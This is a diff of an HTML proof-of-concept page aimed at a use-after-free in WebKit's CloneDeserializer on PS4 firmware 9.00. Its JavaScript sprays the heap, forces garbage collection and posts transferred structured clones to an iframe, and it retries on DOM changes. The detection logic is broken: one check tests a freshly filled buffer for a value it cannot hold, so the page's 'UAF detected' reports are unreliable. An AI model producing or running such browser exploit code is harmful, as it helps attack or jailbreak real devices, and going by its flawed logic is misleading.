@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CloneDeserializer UAF PoC</title>
+    <title>WebKit CloneDeserializer UAF PoC (PS4 9.00)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -22,7 +22,7 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CloneDeserializer::deserialize() UAF PoC</h1>
+    <h1>WebKit CloneDeserializer UAF PoC (PS4 9.00)</h1>
     <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
     <button id="trigger">Trigger PoC</button>
     <div id="status">Idle...</div>
@@ -33,68 +33,76 @@
         let attemptCount = 0;
 
         function sprayHeap() {
+            console.log('Spraying heap...');
             const arrays = [];
-            for (let i = 0; i < 20000; i++) {
+            for (let i = 0; i < 10000; i++) { // قللنا إلى 10000
                 const buf = new Uint8Array(4096);
-                buf.fill(0x45); // Fill with 'E'
+                buf[0] = 0x41; // 'A' للاختبار
+                buf[1] = 0x42; // 'B'
                 arrays.push(buf);
             }
             return arrays;
         }
 
         function stressGC() {
-            // Allocate large objects to pressure GC
-            for (let i = 0; i < 1000; i++) {
-                new ArrayBuffer(1024 * 1024); // 1MB buffers
+            console.log('Stressing GC...');
+            for (let i = 0; i < 500; i++) { // قللنا إلى 500
+                new ArrayBuffer(1024 * 1024); // 1MB
             }
+            console.log('GC stress completed.');
         }
 
         function triggerExploit() {
             attemptCount++;
-            console.log(`Attempt ${attemptCount}: Initiating exploit...`);
+            console.log(`Attempt ${attemptCount}: Initiating...`);
             status.textContent = `Attempt ${attemptCount} in progress...`;
 
             try {
-                // Step 1: Create serializable objects
-                const arrayBuffer = new ArrayBuffer(1024);
+                console.log('Creating complex object...');
+                const arrayBuffer = new ArrayBuffer(4096);
                 const messagePort = new MessageChannel().port1;
                 const complexObject = {
                     buffer: arrayBuffer,
-                    port: messagePort,
-                    nested: [new Uint8Array(100), { x: new ArrayBuffer(512) }]
+                    array: new Uint8Array(1000),
+                    nested: { x: new ArrayBuffer(512) }
                 };
 
-                // Step 2: Use structuredClone to trigger CloneDeserializer
+                console.log('Creating iframe...');
                 const iframe = document.createElement('iframe');
                 container.appendChild(iframe);
                 const iframeWindow = iframe.contentWindow;
 
-                // Post message to force serialization/deserialization
+                console.log('Posting message...');
                 iframeWindow.postMessage(structuredClone(complexObject, {
                     transfer: [arrayBuffer, messagePort]
                 }), '*');
 
-                // Step 3: Stress GC to free objects
-                stressGC();
-
-                // Step 4: Spray heap
-                const arrays = sprayHeap();
-
-                // Step 5: Check for UAF
-                console.log('Scanning for UAF...');
-                for (let i = 0; i < arrays.length; i++) {
-                    if (arrays[i][0] !== 0x45) {
-                        console.log(`UAF detected at index ${i}`);
-                        status.textContent = 'UAF detected!';
+                setTimeout(() => {
+                    console.log('Checking memory after postMessage...');
+                    const testBuf = new Uint8Array(4096);
+                    testBuf.fill(0x46); // 'F'
+                    if (testBuf[0] !== 0x46) {
+                        console.log('Early UAF detected!');
+                        status.textContent = 'Early UAF detected!';
                         return;
                     }
-                }
 
-                console.log('Exploit attempt completed, check for crash.');
-                status.textContent = 'Exploit attempted!';
+                    stressGC();
+                    const arrays = sprayHeap();
 
-                // Clean up
-                container.removeChild(iframe);
+                    console.log('Scanning for UAF...');
+                    for (let i = 0; i < arrays.length; i++) {
+                        if (arrays[i][0] !== 0x41 || arrays[i][1] !== 0x42) {
+                            console.log(`UAF detected at index ${i}`);
+                            status.textContent = 'UAF detected!';
+                            return;
+                        }
+                    }
+
+                    console.log('Exploit completed.');
+                    status.textContent = 'Exploit attempted!';
+                    container.removeChild(iframe);
+                }, 50); // تأخير 50ms
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = 'Failed: Error occurred.';
@@ -102,7 +110,7 @@
         }
 
         const observer = new MutationObserver(() => {
-            console.log('DOM changed, retrying exploit...');
+            console.log('DOM changed, retrying...');
             triggerExploit();
         });
 
@@ -117,10 +125,9 @@
             }
         });
 
-        // Listen for messages to ensure deserialization occurs
         window.addEventListener('message', (event) => {
-            console.log('Message received, deserialization triggered.');
-            stressGC(); // Additional GC stress after deserialization
+            console.log('Message received:', event.data);
+            // لا نضيف stressGC هنا لتجنب التداخل
         });
     </script>
 </body>
